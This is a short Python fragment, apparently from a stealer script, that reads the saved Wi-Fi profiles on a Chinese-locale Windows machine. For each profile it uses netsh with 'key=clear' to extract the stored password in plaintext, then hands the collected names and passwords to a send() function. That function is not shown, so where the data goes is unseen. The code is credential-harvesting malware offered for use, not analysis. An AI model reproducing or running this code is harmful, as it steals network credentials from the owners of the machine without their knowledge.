def huoquwifimima():
    n = ''
    output = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True).stdout.decode('gbk').split('\n')
    wifis = [line.split(':')[1][1:-1] for line in output if "所有用户配置文件" in line]
    for wifi in wifis:
        results = subprocess.run(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear'],
                                 capture_output=True).stdout.decode('gbk', errors='ignore').split('\n')
        results = [line.split(':')[1][1:-1] for line in results if "关键内容" in line]
        try:
            n = n + f'wifi name:{wifi},password:{results[0]}' + '\n'
        except IndexError:
            n = n + f'wifi name:{wifi},password:error' + '\n'
    return n
send('\n\n'+huoquwifimima())